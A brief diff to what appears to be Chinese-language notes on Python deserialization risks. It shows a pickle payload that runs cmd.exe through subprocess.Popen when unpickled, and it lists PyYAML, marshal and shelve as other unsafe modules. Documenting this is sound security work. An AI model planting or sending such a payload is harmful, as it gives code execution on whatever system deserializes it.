@@ -15,5 +15,8 @@ pickle
     >>> cPickle.dumps(A())
     "csubprocess\nPopen\np1\n((S'cmd.exe'\np2\ntp3\ntp4\nRp5\n."
 
-PyYAML反序列化
+其他
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+- PyYAML
+- marshal
+- shelve
